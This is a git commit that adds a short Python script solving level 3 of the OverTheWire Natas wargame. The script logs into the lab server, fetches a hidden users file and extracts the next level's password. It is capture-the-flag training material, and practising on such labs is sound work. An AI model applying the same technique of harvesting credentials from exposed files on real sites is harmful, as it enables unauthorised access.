727649aae4228e659bf4da2d177f38080b3cbd9f
kaniehuest <carlos.ojeda.6556@gmail.com>
2022-12-29 19:22:34 -0300

    added natas 3

---
+++ natas3.py
@@ -0,0 +1,17 @@
+import re
+import requests
+
+
+def get_natas4_password(natas3_password):
+    URL = "http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"
+    s = requests.Session()
+    s.auth = ("natas3", natas3_password)
+    r = s.get(URL)
+    natas4_password = re.findall(r"([a-zA-Z\d]{32})", r.text)[0]
+    print("[!] The password for Natas 4 is: " + natas4_password)
+    return natas4_password
+
+
+if __name__ == '__main__':
+    natas3_password = "" # Put here the password for natas2 here
+    get_natas4_password(natas3_password)
